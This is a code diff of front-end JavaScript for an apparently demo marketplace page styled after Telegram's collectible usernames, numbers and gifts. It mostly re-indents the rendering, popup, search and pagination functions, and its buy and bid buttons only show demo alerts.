+        var loadedGifts = [];
+        var currentOffersSearch = '';
+        var currentNumbersSearch = '';
+        var currentGiftsSearch = '';
+        var currentGiftsCollection = 'all';
+
+        function renderOffers(search) {
+            if (search === undefined) search = '';
+            currentOffersSearch = search;
+            var filtered = offersData.filter(function(item) {
+                return item.name.toLowerCase().includes(search.toLowerCase());
+            });
+            if (offersPage === 0) loadedOffers = [];
+            var start = offersPage * OFFERS_PER_PAGE;
+            var end = Math.min(start + OFFERS_PER_PAGE, filtered.length);
+            var pageItems = filtered.slice(start, end);
+            loadedOffers = loadedOffers.concat(pageItems);
+
+            var tbody = document.getElementById('offers-table-body');
+            document.getElementById('offers-count').textContent = '(' + filtered.length + ')';
+
+            if (loadedOffers.length === 0) {
+                tbody.innerHTML =
+                    '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--table-text-color);font-size:14px;">No offers found</td></tr>';
+                return;
             }
 
-            // ============================================================
-            // ===== RENDER FUNCTIONS =====
-            // ============================================================
+            var html = '';
+            for (var oi = 0; oi < loadedOffers.length; oi++) {
+                var item = loadedOffers[oi];
+                html += '<tr onclick="openDetail(\'' + item.name + '\', \'Username\', ' + item.price + ', ' + (item
+                    .minBid || Math.round(item.price * 1.05)) + ', ' + (item.bidStep || Math.round(item.price *
+                    0.05)) + ', \'' + item.status + '\', \'' + item.label + '\', \'' + item.date + '\', ' + (item
+                    .bids || 0) + ', \'' + (item.endsIn || '—') + '\', \'\', \'\', null, null, null)">';
+                html += '<td>';
+                html += '<a href="#" class="tm-username-link">@' + item.name + '</a>';
+                html += '<span class="tm-username-sub" onclick="event.stopPropagation(); window.open(\'https://t.me/' + item.name + '\', \'_blank\')">feds.t.me</span>';
+                html += '</td>';
+                html += '<td>' + item.type + '</td>';
+                html += '<td><span class="tm-value icon-ton">' + item.price.toLocaleString() + '</span></td>';
+                html += '<td><span class="tm-status-badge ' + item.status + '">' + item.label + '</span></td>';
+                html += '<td class="hide-mobile">' + (item.endsIn || '—') + '</td>';
+                html += '<td class="hide-mobile">' + (item.bids || 0) + '</td>';
+                html += '</tr>';
+            }
+            tbody.innerHTML = html;
 
-            var offersPage = 0;
-            var numbersPage = 0;
-            var giftsPage = 0;
-            var OFFERS_PER_PAGE = 20;
-            var NUMBERS_PER_PAGE = 20;
-            var GIFTS_PER_PAGE = 12;
+            var btn = document.getElementById('offers-load-more');
+            if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
+            else btn.style.display = 'block';
+        }
 
-            var loadedOffers = [];
-            var loadedNumbers = [];
-            var loadedGifts = [];
-            var currentOffersSearch = '';
-            var currentNumbersSearch = '';
-            var currentGiftsSearch = '';
-            var currentGiftsCollection = 'all';
+        function renderNumbers(search) {
+            if (search === undefined) search = '';
+            currentNumbersSearch = search;
+            var filtered = numbersData.filter(function(item) {
+                return item.name.toLowerCase().includes(search.toLowerCase());
+            });
+            if (numbersPage === 0) loadedNumbers = [];
+            var start = numbersPage * NUMBERS_PER_PAGE;
+            var end = Math.min(start + NUMBERS_PER_PAGE, filtered.length);
+            var pageItems = filtered.slice(start, end);
+            loadedNumbers = loadedNumbers.concat(pageItems);
 
-            function renderOffers(search) {
-                if (search === undefined) search = '';
-                currentOffersSearch = search;
-                var filtered = offersData.filter(function(item) {
-                    return item.name.toLowerCase().includes(search.toLowerCase());
-                });
-                if (offersPage === 0) loadedOffers = [];
-                var start = offersPage * OFFERS_PER_PAGE;
-                var end = Math.min(start + OFFERS_PER_PAGE, filtered.length);
-                var pageItems = filtered.slice(start, end);
-                loadedOffers = loadedOffers.concat(pageItems);
+            var tbody = document.getElementById('numbers-table-body');
+            document.getElementById('numbers-count').textContent = '(' + filtered.length + ')';
 
-                var tbody = document.getElementById('offers-table-body');
-                document.getElementById('offers-count').textContent = '(' + filtered.length + ')';
-
-                if (loadedOffers.length === 0) {
-                    tbody.innerHTML =
-                        '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--table-text-color);font-size:14px;">No offers found</td></tr>';
-                    return;
-                }
-
-                var html = '';
-                for (var oi = 0; oi < loadedOffers.length; oi++) {
-                    var item = loadedOffers[oi];
-                    html += '<tr onclick="openDetail(\'' + item.name + '\', \'Username\', ' + item.price + ', ' + (item
-                        .minBid || Math.round(item.price * 1.05)) + ', ' + (item.bidStep || Math.round(item.price *
-                        0.05)) + ', \'' + item.status + '\', \'' + item.label + '\', \'' + item.date + '\', ' + (item
-                        .bids || 0) + ', \'' + (item.endsIn || '—') + '\', \'\', \'\', null, null, null)">';
-                    html += '<td><a href="#" class="tm-username-link">@' + item.name + '</a></td>';
-                    html += '<td>' + item.type + '</td>';
-                    html += '<td><span class="tm-value icon-ton">' + item.price.toLocaleString() + '</span></td>';
-                    html += '<td><span class="tm-status-badge ' + item.status + '">' + item.label + '</span></td>';
-                    html += '<td class="hide-mobile">' + (item.endsIn || '—') + '</td>';
-                    html += '<td class="hide-mobile">' + (item.bids || 0) + '</td>';
-                    html += '</tr>';
-                }
-                tbody.innerHTML = html;
-
-                var btn = document.getElementById('offers-load-more');
-                if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
-                else btn.style.display = 'block';
+            if (loadedNumbers.length === 0) {
+                tbody.innerHTML =
+                    '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--table-text-color);font-size:14px;">No numbers found</td></tr>';
+                return;
             }
 
-            function renderNumbers(search) {
-                if (search === undefined) search = '';
-                currentNumbersSearch = search;
-                var filtered = numbersData.filter(function(item) {
-                    return item.name.toLowerCase().includes(search.toLowerCase());
-                });
-                if (numbersPage === 0) loadedNumbers = [];
-                var start = numbersPage * NUMBERS_PER_PAGE;
-                var end = Math.min(start + NUMBERS_PER_PAGE, filtered.length);
-                var pageItems = filtered.slice(start, end);
-                loadedNumbers = loadedNumbers.concat(pageItems);
+            var html = '';
+            for (var ni2 = 0; ni2 < loadedNumbers.length; ni2++) {
+                var item = loadedNumbers[ni2];
+                html += '<tr onclick="openDetail(\'' + item.name + '\', \'Number\', ' + item.price + ', ' + (item
+                    .minBid || Math.round(item.price * 1.05)) + ', ' + (item.bidStep || Math.round(item.price *
+                    0.05)) + ', \'' + item.status + '\', \'' + item.label + '\', \'' + item.date + '\', ' + (item
+                    .bids || 0) + ', \'' + (item.endsIn || '—') + '\', \'\', \'\', null, null, null)">';
+                html += '<td><a href="#" class="tm-username-link">' + item.name + '</a></td>';
+                html += '<td>' + item.type + '</td>';
+                html += '<td><span class="tm-value icon-ton">' + item.price.toLocaleString() + '</span></td>';
+                html += '<td><span class="tm-status-badge ' + item.status + '">' + item.label + '</span></td>';
+                html += '<td class="hide-mobile">' + (item.endsIn || '—') + '</td>';
+                html += '<td class="hide-mobile">' + (item.bids || 0) + '</td>';
+                html += '</tr>';
+            }
+            tbody.innerHTML = html;
 
-                var tbody = document.getElementById('numbers-table-body');
-                document.getElementById('numbers-count').textContent = '(' + filtered.length + ')';
+            var btn = document.getElementById('numbers-load-more');
+            if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
+            else btn.style.display = 'block';
+        }
 
-                if (loadedNumbers.length === 0) {
-                    tbody.innerHTML =
-                        '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--table-text-color);font-size:14px;">No numbers found</td></tr>';
-                    return;
-                }
+        function renderGifts(collection, search) {
+            if (collection === undefined) collection = 'all';
+            if (search === undefined) search = '';
+            currentGiftsCollection = collection;
+            currentGiftsSearch = search;
 
-                var html = '';
-                for (var ni2 = 0; ni2 < loadedNumbers.length; ni2++) {
-                    var item = loadedNumbers[ni2];
-                    html += '<tr onclick="openDetail(\'' + item.name + '\', \'Number\', ' + item.price + ', ' + (item
-                        .minBid || Math.round(item.price * 1.05)) + ', ' + (item.bidStep || Math.round(item.price *
-                        0.05)) + ', \'' + item.status + '\', \'' + item.label + '\', \'' + item.date + '\', ' + (item
-                        .bids || 0) + ', \'' + (item.endsIn || '—') + '\', \'\', \'\', null, null, null)">';
-                    html += '<td><a href="#" class="tm-username-link">' + item.name + '</a></td>';
-                    html += '<td>' + item.type + '</td>';
-                    html += '<td><span class="tm-value icon-ton">' + item.price.toLocaleString() + '</span></td>';
-                    html += '<td><span class="tm-status-badge ' + item.status + '">' + item.label + '</span></td>';
-                    html += '<td class="hide-mobile">' + (item.endsIn || '—') + '</td>';
-                    html += '<td class="hide-mobile">' + (item.bids || 0) + '</td>';
-                    html += '</tr>';
-                }
-                tbody.innerHTML = html;
+            var filtered = giftsData.filter(function(item) {
+                var matchCollection = collection === 'all' || item.collection === collection;
+                var matchSearch = item.name.toLowerCase().includes(search.toLowerCase()) ||
+                    item.collection.toLowerCase().includes(search.toLowerCase());
+                return matchCollection && matchSearch;
+            });
 
-                var btn = document.getElementById('numbers-load-more');
-                if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
-                else btn.style.display = 'block';
+            if (giftsPage === 0) loadedGifts = [];
+            var start = giftsPage * GIFTS_PER_PAGE;
+            var end = Math.min(start + GIFTS_PER_PAGE, filtered.length);
+            var pageItems = filtered.slice(start, end);
+            loadedGifts = loadedGifts.concat(pageItems);
+
+            var grid = document.getElementById('gifts-grid');
+            document.getElementById('gifts-count').textContent = '(' + filtered.length + ')';
+
+            if (loadedGifts.length === 0) {
+                grid.innerHTML =
+                    '<div style="width:100%;text-align:center;padding:24px 12px;color:var(--table-text-color);font-size:14px;">No gifts found</div>';
+                return;
             }
 
-            function renderGifts(collection, search) {
-                if (collection === undefined) collection = 'all';
-                if (search === undefined) search = '';
-                currentGiftsCollection = collection;
-                currentGiftsSearch = search;
-
-                var filtered = giftsData.filter(function(item) {
-                    var matchCollection = collection === 'all' || item.collection === collection;
-                    var matchSearch = item.name.toLowerCase().includes(search.toLowerCase()) ||
-                        item.collection.toLowerCase().includes(search.toLowerCase());
-                    return matchCollection && matchSearch;
-                });
-
-                if (giftsPage === 0) loadedGifts = [];
-                var start = giftsPage * GIFTS_PER_PAGE;
-                var end = Math.min(start + GIFTS_PER_PAGE, filtered.length);
-                var pageItems = filtered.slice(start, end);
-                loadedGifts = loadedGifts.concat(pageItems);
-
-                var grid = document.getElementById('gifts-grid');
-                document.getElementById('gifts-count').textContent = '(' + filtered.length + ')';
-
-                if (loadedGifts.length === 0) {
-                    grid.innerHTML =
-                        '<div style="width:100%;text-align:center;padding:24px 12px;color:var(--table-text-color);font-size:14px;">No gifts found</div>';
-                    return;
-                }
-
-                grid.innerHTML = '';
-                for (var gi = 0; gi < loadedGifts.length; gi++) {
-                    var item = loadedGifts[gi];
-                    var div = document.createElement('div');
-                    div.className = 'tm-grid-item';
-                    div.innerHTML =
-                        '<div class="tm-grid-item-link">' +
-                        '<div class="tm-grid-item-thumb">' +
-                        '<img src="' + item.image + '" loading="lazy" onerror="this.src=\'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%231a2026%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%234db2ff%22%3E🎁%3C/text%3E%3C/svg%3E\'">' +
-                        '<div class="tm-grid-item-num">' + item.num + '</div>' +
-                        '</div>' +
-                        '<div class="tm-grid-item-content">' +
-                        '<div class="tm-grid-item-name"><span class="item-name">' + item.name + '</span><span class="item-num">' +
-                        item.num + '</span></div>' +
-                        '<div class="tm-grid-item-desc">' + item.collection + '</div>' +
-                        '<div class="tm-grid-item-values">' +
-                        '<div class="tm-grid-item-value tm-value icon-ton">' + item.price.toLocaleString() +
-                        '</div>' +
-                        '<div class="tm-grid-item-status ' + item.status + '">' + item.label + '</div>' +
-                        '</div>' +
-                        '</div>' +
-                        '</div>';
-                    div.addEventListener('click', (function(item) {
-                        return function() {
-                            openDetail(
-                                item.name + ' ' + item.num,
-                                'Gift',
-                                item.price,
-                                Math.round(item.price * 1.05),
-                                Math.round(item.price * 0.05),
-                                item.status,
-                                item.label,
-                                item.date,
-                                0,
-                                '—',
-                                item.image,
-                                item.collection,
-                                JSON.stringify(item.attrs),
-                                item.owner,
-                                JSON.stringify(item.history)
-                            );
-                        };
-                    })(item));
-                    grid.appendChild(div);
-                }
-
-                var btn = document.getElementById('gifts-load-more');
-                if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
-                else btn.style.display = 'block';
-            }
-
-            function renderFilterCollections() {
-                var container = document.getElementById('gift-filter-content');
-                var collectionsMap = {};
-                for (var gi2 = 0; gi2 < giftsData.length; gi2++) {
-                    var item = giftsData[gi2];
-                    collectionsMap[item.collection] = (collectionsMap[item.collection] || 0) + 1;
-                }
-
-                var html = '<div class="tm-main-filters-item selected" data-collection="all">' +
-                    '<span class="tm-main-filters-name">All Collections</span>' +
-                    '<span class="tm-main-filters-count">' + giftsData.length + '</span>' +
+            grid.innerHTML = '';
+            for (var gi = 0; gi < loadedGifts.length; gi++) {
+                var item = loadedGifts[gi];
+                var div = document.createElement('div');
+                div.className = 'tm-grid-item';
+                div.innerHTML =
+                    '<div class="tm-grid-item-link">' +
+                    '<div class="tm-grid-item-thumb">' +
+                    '<img src="' + item.image + '" loading="lazy" onerror="this.src=\'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%231a2026%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%234db2ff%22%3E🎁%3C/text%3E%3C/svg%3E\'">' +
+                    '<div class="tm-grid-item-num">' + item.num + '</div>' +
+                    '</div>' +
+                    '<div class="tm-grid-item-content">' +
+                    '<div class="tm-grid-item-name"><span class="item-name">' + item.name + '</span><span class="item-num">' +
+                    item.num + '</span></div>' +
+                    '<div class="tm-grid-item-desc">' + item.collection + '</div>' +
+                    '<div class="tm-grid-item-values">' +
+                    '<div class="tm-grid-item-value tm-value icon-ton">' + item.price.toLocaleString() +
+                    '</div>' +
+                    '<div class="tm-grid-item-status ' + item.status + '">' + item.label + '</div>' +
+                    '</div>' +
+                    '</div>' +
                     '</div>';
-
-                var sorted = Object.keys(collectionsMap).sort(function(a, b) { return collectionsMap[b] - collectionsMap[
-                    a]; });
-                for (var sci = 0; sci < sorted.length; sci++) {
-                    var name = sorted[sci];
-                    html += '<div class="tm-main-filters-item" data-collection="' + name + '">' +
-                        '<span class="tm-main-filters-name">' + name + '</span>' +
-                        '<span class="tm-main-filters-count">' + collectionsMap[name] + '</span>' +
-                        '</div>';
-                }
-
-                container.innerHTML = html;
-                document.getElementById('gift-filter-count').textContent = giftsData.length;
-
-                container.querySelectorAll('.tm-main-filters-item').forEach(function(el) {
-                    el.addEventListener('click', function() {
-                        container.querySelectorAll('.tm-main-filters-item').forEach(function(f) { f
-                                .classList.remove('selected'); });
-                        this.classList.add('selected');
-                        giftsPage = 0;
-                        loadedGifts = [];
-                        renderGifts(this.dataset.collection, document.getElementById('search-gifts')
-                        .value);
-                    });
-                });
+                div.addEventListener('click', (function(item) {
+                    return function() {
+                        openDetail(
+                            item.name + ' ' + item.num,
+                            'Gift',
+                            item.price,
+                            Math.round(item.price * 1.05),
+                            Math.round(item.price * 0.05),
+                            item.status,
+                            item.label,
+                            item.date,
+                            0,
+                            '—',
+                            item.image,
+                            item.collection,
+                            JSON.stringify(item.attrs),
+                            item.owner,
+                            JSON.stringify(item.history)
+                        );
+                    };
+                })(item));
+                grid.appendChild(div);
             }
 
-            // ============================================================
-            // ===== DETAIL POPUP =====
-            // ============================================================
+            var btn = document.getElementById('gifts-load-more');
+            if (end >= filtered.length || filtered.length === 0) btn.style.display = 'none';
+            else btn.style.display = 'block';
+        }
 
-            function openDetail(name, type, price, minBid, bidStep, status, label, date, bids, endsIn, imageUrl,
-                collection, attrs, owner, history) {
-                var isGift = type === 'Gift';
-                var title = isGift ? name : (type === 'Username' ? '@' + name : name);
+        function renderFilterCollections() {
+            var container = document.getElementById('gift-filter-content');
+            var collectionsMap = {};
+            for (var gi2 = 0; gi2 < giftsData.length; gi2++) {
+                var item = giftsData[gi2];
+                collectionsMap[item.collection] = (collectionsMap[item.collection] || 0) + 1;
+            }
 
-                document.getElementById('popup-title').textContent = title;
-                document.getElementById('popup-subtitle').textContent = isGift ? (collection || 'Telegram Gift') :
-                    (type === 'Username' ? 'Telegram Username' : 'Collectible Number for Telegram');
+            var html = '<div class="tm-main-filters-item selected" data-collection="all">' +
+                '<span class="tm-main-filters-name">All Collections</span>' +
+                '<span class="tm-main-filters-count">' + giftsData.length + '</span>' +
+                '</div>';
 
-                document.getElementById('popup-highest-bid').textContent = price.toLocaleString();
-                document.getElementById('popup-min-bid').textContent = (minBid || Math.round(price * 1.05))
-                    .toLocaleString();
-                document.getElementById('popup-bid-step').textContent = (bidStep || Math.round(price * 0.05))
-                    .toLocaleString();
-                document.getElementById('popup-total-bids').textContent = bids || 0;
-                document.getElementById('popup-detail-status').textContent = label || 'Available';
-                document.getElementById('popup-detail-date').textContent = date || 'Today';
-                document.getElementById('popup-countdown').textContent = endsIn || '—';
+            var sorted = Object.keys(collectionsMap).sort(function(a, b) { return collectionsMap[b] - collectionsMap[
+                a]; });
+            for (var sci = 0; sci < sorted.length; sci++) {
+                var name = sorted[sci];
+                html += '<div class="tm-main-filters-item" data-collection="' + name + '">' +
+                    '<span class="tm-main-filters-name">' + name + '</span>' +
+                    '<span class="tm-main-filters-count">' + collectionsMap[name] + '</span>' +
+                    '</div>';
+            }
 
-                var statusBadge = document.getElementById('popup-status-badge');
-                statusBadge.textContent = label || 'On auction';
-                statusBadge.className = 'popup-status-badge ' + (status || 'avail');
+            container.innerHTML = html;
+            document.getElementById('gift-filter-count').textContent = giftsData.length;
 
-                var giftContainer = document.getElementById('popup-gift-image');
-                var giftImg = document.getElementById('popup-gift-img');
-                if (isGift && imageUrl) {
-                    giftContainer.style.display = 'flex';
-                    giftImg.src = imageUrl;
-                    giftImg.onerror = function() {
-                        this.src =
-                            'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%231a2026%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%234db2ff%22%3E🎁%3C/text%3E%3C/svg%3E';
-                    };
-                } else {
-                    giftContainer.style.display = 'none';
+            container.querySelectorAll('.tm-main-filters-item').forEach(function(el) {
+                el.addEventListener('click', function() {
+                    container.querySelectorAll('.tm-main-filters-item').forEach(function(f) { f
+                            .classList.remove('selected'); });
+                    this.classList.add('selected');
+                    giftsPage = 0;
+                    loadedGifts = [];
+                    renderGifts(this.dataset.collection, document.getElementById('search-gifts')
+                    .value);
+                });
+            });
+        }
+
+        // ============================================================
+        // ===== DETAIL POPUP =====
+        // ============================================================
+
+        function openDetail(name, type, price, minBid, bidStep, status, label, date, bids, endsIn, imageUrl,
+            collection, attrs, owner, history) {
+            var isGift = type === 'Gift';
+            var title = isGift ? name : (type === 'Username' ? '@' + name : name);
+
+            document.getElementById('popup-title').textContent = title;
+            document.getElementById('popup-subtitle').textContent = isGift ? (collection || 'Telegram Gift') :
+                (type === 'Username' ? 'Telegram Username' : 'Collectible Number for Telegram');
+
+            document.getElementById('popup-highest-bid').textContent = price.toLocaleString();
+            document.getElementById('popup-min-bid').textContent = (minBid || Math.round(price * 1.05))
+                .toLocaleString();
+            document.getElementById('popup-bid-step').textContent = (bidStep || Math.round(price * 0.05))
+                .toLocaleString();
+            document.getElementById('popup-total-bids').textContent = bids || 0;
+            document.getElementById('popup-detail-status').textContent = label || 'Available';
+            document.getElementById('popup-detail-date').textContent = date || 'Today';
+            document.getElementById('popup-countdown').textContent = endsIn || '—';
+
+            var statusBadge = document.getElementById('popup-status-badge');
+            statusBadge.textContent = label || 'On auction';
+            statusBadge.className = 'popup-status-badge ' + (status || 'avail');
+
+            var giftContainer = document.getElementById('popup-gift-image');
+            var giftImg = document.getElementById('popup-gift-img');
+            if (isGift && imageUrl) {
+                giftContainer.style.display = 'flex';
+                giftImg.src = imageUrl;
+                giftImg.onerror = function() {
+                    this.src =
+                        'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%231a2026%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%234db2ff%22%3E🎁%3C/text%3E%3C/svg%3E';
+                };
+            } else {
+                giftContainer.style.display = 'none';
+            }
+
+            var attrsContainer = document.getElementById('popup-attributes');
+            if (isGift && attrs) {
+                var parsedAttrs = attrs;
+                if (typeof attrs === 'string') {
+                    try { parsedAttrs = JSON.parse(attrs); } catch (e) { parsedAttrs = {}; }
                 }
-
-                var attrsContainer = document.getElementById('popup-attributes');
-                if (isGift && attrs) {
-                    var parsedAttrs = attrs;
-                    if (typeof attrs === 'string') {
-                        try { parsedAttrs = JSON.parse(attrs); } catch (e) { parsedAttrs = {}; }
-                    }
-                    if (Object.keys(parsedAttrs).length > 0) {
-                        attrsContainer.style.display = 'block';
-                        var attrsHtml = '';
-                        var ai = 0;
-                        for (var key in parsedAttrs) {
-                            if (parsedAttrs.hasOwnProperty(key)) {
-                                var val = parsedAttrs[key];
-                                var rarity = rarityPcts[ai % rarityPcts.length];
-                                attrsHtml +=
-                                    '<div class="popup-attr-row"><span class="popup-attr-label">' + key +
-                                    '</span><span class="popup-attr-value">' + val +
-                                    ' <span class="popup-attr-rarity">' + rarity + '</span></span></div>';
-                                ai++;
-                            }
+                if (Object.keys(parsedAttrs).length > 0) {
+                    attrsContainer.style.display = 'block';
+                    var attrsHtml = '';
+                    var ai = 0;
+                    for (var key in parsedAttrs) {
+                        if (parsedAttrs.hasOwnProperty(key)) {
+                            var val = parsedAttrs[key];
+                            var rarity = rarityPcts[ai % rarityPcts.length];
+                            attrsHtml +=
+                                '<div class="popup-attr-row"><span class="popup-attr-label">' + key +
+                                '</span><span class="popup-attr-value">' + val +
+                                ' <span class="popup-attr-rarity">' + rarity + '</span></span></div>';
+                            ai++;
                         }
-                        attrsContainer.innerHTML = attrsHtml;
-                    } else {
-                        attrsContainer.style.display = 'none';
                     }
+                    attrsContainer.innerHTML = attrsHtml;
                 } else {
                     attrsContainer.style.display = 'none';
                 }
+            } else {
+                attrsContainer.style.display = 'none';
+            }
 
-                var ownerRow = document.getElementById('popup-owner-row');
-                var ownerEl = document.getElementById('popup-detail-owner');
-                if (owner) {
-                    ownerRow.style.display = 'flex';
-                    ownerEl.innerHTML = '<span class="tm-wallet">' + owner.slice(0, 10) + '...' + owner.slice(-6) +
-                        '</span>';
-                } else {
-                    ownerRow.style.display = 'none';
-                    ownerEl.textContent = '—';
+            var ownerRow = document.getElementById('popup-owner-row');
+            var ownerEl = document.getElementById('popup-detail-owner');
+            if (owner) {
+                ownerRow.style.display = 'flex';
+                ownerEl.innerHTML = '<span class="tm-wallet">' + owner.slice(0, 10) + '...' + owner.slice(-6) +
+                    '</span>';
+            } else {
+                ownerRow.style.display = 'none';
+                ownerEl.textContent = '—';
+            }
+
+            var ownershipContainer = document.getElementById('popup-ownership');
+            var ownershipList = document.getElementById('popup-ownership-list');
+            if (isGift && history) {
+                var parsedHistory = history;
+                if (typeof history === 'string') {
+                    try { parsedHistory = JSON.parse(history); } catch (e) { parsedHistory = []; }
                 }
-
-                var ownershipContainer = document.getElementById('popup-ownership');
-                var ownershipList = document.getElementById('popup-ownership-list');
-                if (isGift && history) {
-                    var parsedHistory = history;
-                    if (typeof history === 'string') {
-                        try { parsedHistory = JSON.parse(history); } catch (e) { parsedHistory = []; }
+                if (parsedHistory && parsedHistory.length > 0) {
+                    ownershipContainer.style.display = 'block';
+                    var histHtml = '';
+                    for (var hi = 0; hi < parsedHistory.length; hi++) {
+                        var hItem = parsedHistory[hi];
+                        histHtml += '<div class="popup-ownership-item">' +
+                            '<span>' + hItem.price + '</span>' +
+                            '<span>' + hItem.date + '</span>' +
+                            '<span class="owner">' + hItem.buyer.slice(0, 10) + '...' + hItem.buyer.slice(-6) +
+                            '</span>' +
+                            '</div>';
                     }
-                    if (parsedHistory && parsedHistory.length > 0) {
-                        ownershipContainer.style.display = 'block';
-                        var histHtml = '';
-                        for (var hi = 0; hi < parsedHistory.length; hi++) {
-                            var hItem = parsedHistory[hi];
-                            histHtml += '<div class="popup-ownership-item">' +
-                                '<span>' + hItem.price + '</span>' +
-                                '<span>' + hItem.date + '</span>' +
-                                '<span class="owner">' + hItem.buyer.slice(0, 10) + '...' + hItem.buyer.slice(-6) +
-                                '</span>' +
-                                '</div>';
-                        }
-                        ownershipList.innerHTML = histHtml;
-                    } else {
-                        ownershipContainer.style.display = 'none';
-                    }
+                    ownershipList.innerHTML = histHtml;
                 } else {
                     ownershipContainer.style.display = 'none';
                 }
-
-                document.getElementById('detail-popup').classList.remove('hide');
+            } else {
+                ownershipContainer.style.display = 'none';
             }
 
-            document.getElementById('popup-close').addEventListener('click', function() {
-                document.getElementById('detail-popup').classList.add('hide');
-            });
-            document.getElementById('detail-popup').addEventListener('click', function(e) {
-                if (e.target === this) this.classList.add('hide');
-            });
-            document.getElementById('popup-bid-btn').addEventListener('click', function() {
-                alert('Place Bid clicked! (demo)');
-                document.getElementById('detail-popup').classList.add('hide');
-            });
-            document.getElementById('popup-buy-btn').addEventListener('click', function() {
-                alert('Buy Now clicked! (demo)');
-                document.getElementById('detail-popup').classList.add('hide');
-            });
+            document.getElementById('detail-popup').classList.remove('hide');
+        }
 
-            // ============================================================
-            // ===== SEARCH =====
-            // ============================================================
+        document.getElementById('popup-close').addEventListener('click', function() {
+            document.getElementById('detail-popup').classList.add('hide');
+        });
+        document.getElementById('detail-popup').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.add('hide');
+        });
+        document.getElementById('popup-bid-btn').addEventListener('click', function() {
+            alert('Place Bid clicked! (demo)');
+            document.getElementById('detail-popup').classList.add('hide');
+        });
+        document.getElementById('popup-buy-btn').addEventListener('click', function() {
+            alert('Buy Now clicked! (demo)');
+            document.getElementById('detail-popup').classList.add('hide');
+        });
 
-            document.getElementById('search-offers').addEventListener('input', function() {
-                offersPage = 0;
-                loadedOffers = [];
-                renderOffers(this.value);
-            });
-            document.getElementById('search-numbers').addEventListener('input', function() {
-                numbersPage = 0;
-                loadedNumbers = [];
-                renderNumbers(this.value);
-            });
-            document.getElementById('search-gifts').addEventListener('input', function() {
-                giftsPage = 0;
-                loadedGifts = [];
-                renderGifts(currentGiftsCollection, this.value);
-            });
+        // ============================================================
+        // ===== SEARCH =====
+        // ============================================================
 
-            document.querySelectorAll('.tm-search-clear').forEach(function(clear) {
-                clear.addEventListener('click', function() {
-                    var input = this.parentElement.querySelector('input');
-                    if (input) {
-                        input.value = '';
-                        input.dispatchEvent(new Event('input'));
-                        input.focus();
-                    }
-                });
-            });
+        document.getElementById('search-offers').addEventListener('input', function() {
+            offersPage = 0;
+            loadedOffers = [];
+            renderOffers(this.value);
+        });
+        document.getElementById('search-numbers').addEventListener('input', function() {
+            numbersPage = 0;
+            loadedNumbers = [];
+            renderNumbers(this.value);
+        });
+        document.getElementById('search-gifts').addEventListener('input', function() {
+            giftsPage = 0;
+            loadedGifts = [];
+            renderGifts(currentGiftsCollection, this.value);
+        });
 
-            // ============================================================
-            // ===== LOAD MORE =====
-            // ============================================================
-
-            document.getElementById('offers-load-more').addEventListener('click', function() {
-                offersPage++;
-                renderOffers(currentOffersSearch);
-            });
-            document.getElementById('numbers-load-more').addEventListener('click', function() {
-                numbersPage++;
-                renderNumbers(currentNumbersSearch);
-            });
-            document.getElementById('gifts-load-more').addEventListener('click', function() {
-                giftsPage++;
-                renderGifts(currentGiftsCollection, currentGiftsSearch);
-            });
-
-            // ============================================================
-            // ===== FILTER TOGGLE =====
-            // ============================================================
-
-            document.getElementById('gift-filters-toggle').addEventListener('click', function() {
-                var box = document.getElementById('gift-filters');
-                if (box.classList.contains('opened')) {
-                    box.classList.remove('opened');
-                    box.classList.add('closed');
-                } else {
-                    box.classList.remove('closed');
-                    box.classList.add('opened');
+        document.querySelectorAll('.tm-search-clear').forEach(function(clear) {
+            clear.addEventListener('click', function() {
+                var input = this.parentElement.querySelector('input');
+                if (input) {
+                    input.value = '';
+                    input.dispatchEvent(new Event('input'));
+                    input.focus();
                 }
             });
+        });
 
-            // ============================================================
-            // ===== STARS / PREMIUM =====
-            // ============================================================
+        // ============================================================
+        // ===== LOAD MORE =====
+        // ============================================================
 
-            document.querySelector('.js-stars-buy-btn').addEventListener('click', function() {
-                alert('Buy Stars clicked! (demo)');
+        document.getElementById('offers-load-more').addEventListener('click', function() {
+            offersPage++;
+            renderOffers(currentOffersSearch);
+        });
+        document.getElementById('numbers-load-more').addEventListener('click', function() {
+            numbersPage++;
+            renderNumbers(currentNumbersSearch);
+        });
+        document.getElementById('gifts-load-more').addEventListener('click', function() {
+            giftsPage++;
+            renderGifts(currentGiftsCollection, currentGiftsSearch);
+        });
+
+        // ============================================================
+        // ===== FILTER TOGGLE =====
+        // ============================================================
+
+        document.getElementById('gift-filters-toggle').addEventListener('click', function() {
+            var box = document.getElementById('gift-filters');
+            if (box.classList.contains('opened')) {
+                box.classList.remove('opened');
+                box.classList.add('closed');
+            } else {
+                box.classList.remove('closed');
+                box.classList.add('opened');
+            }
+        });
+
+        // ============================================================
+        // ===== STARS / PREMIUM =====
+        // ============================================================
+
+        document.querySelector('.js-stars-buy-btn').addEventListener('click', function() {
+            alert('Buy Stars clicked! (demo)');
+        });
+        document.querySelector('.js-giveaway-premium-btn').addEventListener('click', function() {
+            alert('Buy Subscriptions clicked! (demo)');
+        });
+
